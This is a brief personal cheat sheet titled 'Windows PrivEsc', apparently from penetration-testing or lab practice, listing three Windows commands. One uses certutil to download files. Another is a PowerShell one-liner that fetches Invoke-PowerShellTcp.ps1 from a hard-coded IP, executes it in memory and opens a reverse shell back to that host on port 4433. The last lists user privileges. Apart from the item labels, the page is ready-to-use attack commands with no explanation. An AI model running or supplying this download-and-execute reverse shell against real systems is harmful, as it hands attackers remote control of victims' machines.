# Windows PrivEsc

> Shahrukh Tramboo | February 12th, 2022

--------------------------------------

**Some Windows Commands**

1.	Certutil:
```bash
Certutil -urlcache -f source destination
```

2. Powershell iex:
```bash
powershell iex (New-Object Net.WebClient).DownloadString('http://10.17.39.185:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.17.39.185 -Port 4433
```

3. Priveleges:
View all the privileges using 
```bash
whoami /priv
```